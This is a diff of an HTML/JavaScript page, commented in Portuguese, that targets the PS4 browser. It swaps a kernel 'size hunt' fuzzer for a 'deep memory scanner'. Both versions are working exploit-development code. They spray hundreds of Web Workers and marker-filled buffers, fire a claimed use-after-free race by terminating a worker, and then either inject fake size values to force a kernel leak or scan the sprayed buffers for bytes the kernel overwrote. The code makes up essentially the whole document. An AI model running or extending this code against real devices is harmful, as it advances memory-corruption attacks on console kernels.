@@ -2,161 +2,143 @@
 <html lang="pt-PT">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 STRUCTURE FUZZER 2</title>
+    <title>PS4 DEEP SCANNER</title>
     <style>
-        body { background-color: #111; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
-        .panel { border: 1px solid #444; background: #222; padding: 20px; margin: 20px auto; max-width: 600px; }
-        
-        input { background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 1.5em; width: 100px; text-align: center; }
-        button { padding: 15px 30px; font-size: 1.2em; background: #c00; color: #fff; border: none; cursor: pointer; margin-top: 10px; }
-        button:hover { background: #f00; }
-        
-        #current-test { font-size: 3em; font-weight: bold; color: #ff0; margin: 20px; }
-        #log { text-align: left; height: 200px; overflow-y: scroll; border: 1px solid #555; padding: 10px; color: #aaa; }
-        
-        .success { background-color: #0f0 !important; color: #000 !important; }
+        body { background-color: #000; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
+        #status { font-size: 1.5em; border: 1px solid #555; padding: 20px; margin: 20px 0; background: #111; }
+        #matrix { display: grid; grid-template-columns: repeat(16, 1fr); gap: 2px; max-width: 800px; margin: 0 auto; font-size: 0.8em; display: none; }
+        .cell { padding: 5px; background: #222; }
+        .changed { background: #f00 !important; font-weight: bold; color: #fff; border: 2px solid #fff; }
+        .safe { color: #555; }
     </style>
 </head>
 <body>
 
-    <h1>KERNEL FUZZER (SIZE HUNT)</h1>
-    
-    <div class="panel">
-        <label>Começar no Offset:</label><br>
-        <input type="number" id="start-offset" value="0" step="4">
-        <br><br>
-        <button onclick="startFuzzing()">INICIAR VARREDURA</button>
-    </div>
-
-    <div id="current-test">PARADO</div>
-    <div id="log">Logs aparecerão aqui...</div>
+    <h1>DEEP MEMORY SCANNER</h1>
+    <div id="status">A preparar...</div>
+    <div id="matrix"></div>
 
     <script>
         // CONFIGURAÇÃO
         const TARGET_THREADS = 417; 
-        const SPRAY_SIZE = 1024;
-        
-        // VALOR DE TESTE: 
-        // 0x2000 = 8192 bytes (Queremos forçar um vazamento grande)
-        // Se o offset for um tamanho, o kernel tentará ler 8192 bytes.
-        const TEST_VALUE = 0x2000; 
+        const STRUCT_SIZE = 512;
+        const FILL_BYTE = 0xCC; // Padrão de fundo (204)
 
         let workers = [];
-        let currentOffset = 0;
-        let fuzzInterval = null;
-
-        // Worker Inteligente: Analisa o tamanho da resposta
-        const blob = new Blob([`
-            onmessage = function(e) {
-                // Devolve o tamanho real e os dados se forem grandes
-                postMessage({len: e.data.byteLength, data: e.data});
-            }
-        `], {type:'text/javascript'});
-        const url = URL.createObjectURL(blob);
+        let sensorArrays = []; // Arrays sensores
         
+        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
+        const url = URL.createObjectURL(blob);
         const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
         const killerUrl = URL.createObjectURL(killerBlob);
 
-        function log(msg) {
-            const el = document.getElementById('log');
-            el.innerHTML = `> ${msg}<br>` + el.innerHTML;
+        function start() {
+            document.getElementById('status').innerText = "1. ALOCANDO SENSORES...";
+            
+            // Cria arrays sensores preenchidos com 0xCC
+            // Usamos Uint8Array para precisão byte-a-byte
+            try {
+                for(let i=0; i<800; i++) {
+                    let ab = new ArrayBuffer(STRUCT_SIZE);
+                    let arr = new Uint8Array(ab);
+                    arr.fill(FILL_BYTE);
+                    
+                    // Marcação de segurança no início (para não confundir com outros objetos)
+                    arr[0] = 0xAA; 
+                    arr[1] = 0xBB;
+                    
+                    sensorArrays.push(arr);
+                }
+            } catch(e) {
+                document.getElementById('status').innerText = "ERRO MEMÓRIA. REINICIE.";
+                return;
+            }
+
+            document.getElementById('status').innerText = "2. CRIANDO THREADS...";
+            createThreads();
         }
 
-        function startFuzzing() {
-            currentOffset = parseInt(document.getElementById('start-offset').value);
-            document.getElementById('current-test').innerText = "PREPARANDO...";
-            
-            // Cria threads
+        function createThreads() {
             let i = setInterval(() => {
                 if (workers.length < TARGET_THREADS) {
-                    const w = new Worker(url);
-                    w.onmessage = handleResponse;
-                    workers.push(w);
+                    workers.push(new Worker(url));
+                    if(workers.length % 50 === 0) document.getElementById('status').innerText = `THREADS: ${workers.length}...`;
                 } else {
                     clearInterval(i);
-                    log("Threads prontas. Iniciando loop de Fuzzing...");
-                    fuzzNext();
+                    document.getElementById('status').innerText = "3. PROVOCANDO O KERNEL...";
+                    setTimeout(triggerUAF, 1000);
                 }
             }, 30);
         }
 
-        function fuzzNext() {
-            // Limite de segurança (Estrutura tem 512 bytes)
-            if(currentOffset >= SPRAY_SIZE) {
-                document.getElementById('current-test').innerText = "FIM DA VARREDURA";
-                return;
-            }
-
-            // Atualiza tela (Se o console desligar, você saberá onde parou)
-            document.getElementById('current-test').innerText = `OFFSET: ${currentOffset}`;
+        function triggerUAF() {
+            // Mata thread e espera que o Kernel escreva nos nossos sensores
+            const w = new Worker(killerUrl);
+            w.terminate();
             
-            // Prepara Payload
-            const payload = new Uint8Array(SPRAY_SIZE);
-            payload.fill(0x00); // Fundo seguro
-            
-            // INJETA O VALOR DE TAMANHO FALSO NO OFFSET ATUAL
-            const view = new DataView(payload.buffer);
-            // offset, value, littleEndian
-            try {
-                view.setUint32(currentOffset, TEST_VALUE, true); 
-            } catch(e) {
-                // Ignora erros de alinhamento no final
-            }
-
-            // Dispara UAF
-            let attempts = 0;
-            const atk = setInterval(() => {
-                const w = new Worker(killerUrl);
-                w.terminate();
-                try { 
-                    if(workers.length > 0) workers[0].postMessage(payload); 
-                } catch(e){}
-                
-                attempts++;
-                if(attempts > 20) { // Tenta 20x por offset
-                    clearInterval(atk);
-                    // Passa para o próximo offset
-                    currentOffset += 4; // Pula de 4 em 4 bytes (Int32)
-                    setTimeout(fuzzNext, 200); // Delay pequeno
-                }
-            }, 10);
+            // Espera um momento para o Kernel reagir (Race Condition)
+            setTimeout(scanSensors, 500);
         }
 
-        function handleResponse(e) {
-            const len = e.data.len;
+        function scanSensors() {
+            document.getElementById('status').innerText = "4. ANALISANDO DANOS...";
             
-            // Se recebermos mais dados do que enviamos (512)
-            if (len > SPRAY_SIZE) {
-                // SUCESSO ABSOLUTO!
-                document.body.style.backgroundColor = "#050";
-                document.getElementById('current-test').className = "success";
-                document.getElementById('current-test').innerText = `LEAK NO OFFSET ${currentOffset}!`;
+            let anomalies = [];
+            
+            for(let i=0; i<sensorArrays.length; i++) {
+                const arr = sensorArrays[i];
                 
-                log(`!!! VAZAMENTO DETECTADO !!!`);
-                log(`Tamanho recebido: ${len}`);
-                log(`OFFSET MÁGICO: ${currentOffset}`); // Esse é o offset 432 ou outro
-                
-                // Extrai o leak para mostrar na tela
-                const bytes = new Uint8Array(e.data.data);
-                let leakHex = "";
-                // Pega os primeiros 32 bytes DEPOIS dos 512 originais
-                for(let k=SPRAY_SIZE; k < len && k < SPRAY_SIZE+32; k++) {
-                    leakHex += bytes[k].toString(16).padStart(2,'0');
+                // Verifica a marcação (se sumiu, o objeto foi totalmente sobrescrito)
+                if(arr[0] !== 0xAA || arr[1] !== 0xBB) {
+                    // Ignora, provavelmente foi reciclado pelo navegador
+                    continue; 
                 }
-                log(`DADOS EXTRAÍDOS: ${leakHex}`);
 
-                // Para tudo
-                workers.forEach(w => w.terminate());
-                workers = [];
-                currentOffset = 9999;
-                alert(`LEAK ENCONTRADO NO OFFSET ${currentOffset}! TIRE UMA FOTO!`);
+                // Verifica byte a byte
+                for(let k=2; k<STRUCT_SIZE; k++) {
+                    if(arr[k] !== FILL_BYTE) {
+                        anomalies.push({offset: k, val: arr[k]});
+                    }
+                }
+                
+                if(anomalies.length > 0) {
+                    report(anomalies);
+                    return;
+                }
             }
+            
+            document.getElementById('status').innerText = "NADA DETECTADO. TENTE RECARREGAR (F5).";
         }
+
+        function report(anomalies) {
+            document.getElementById('status').innerText = "ALTERAÇÃO DETECTADA!!";
+            document.getElementById('status').style.background = "#050";
+            
+            const m = document.getElementById('matrix');
+            m.style.display = 'grid';
+            
+            // Mostra onde mudou
+            let html = "";
+            let changesText = "OFFSETS ALTERADOS:\n";
+            
+            // Mapeia os primeiros 512 bytes visualmente
+            for(let i=0; i<STRUCT_SIZE; i++) {
+                let changed = anomalies.find(a => a.offset === i);
+                if(changed) {
+                    html += `<div class="cell changed">${changed.val.toString(16).padStart(2,'0')}</div>`;
+                    changesText += `Offset ${i}: 0x${changed.val.toString(16)}\n`;
+                } else {
+                    html += `<div class="cell safe">..</div>`;
+                }
+            }
+            m.innerHTML = html;
+            
+            console.log(changesText);
+            alert(changesText); // Popup para chamar atenção
+        }
+
+        setTimeout(start, 500);
 
     </script>
 </body>
 </html>
-
-
-
-
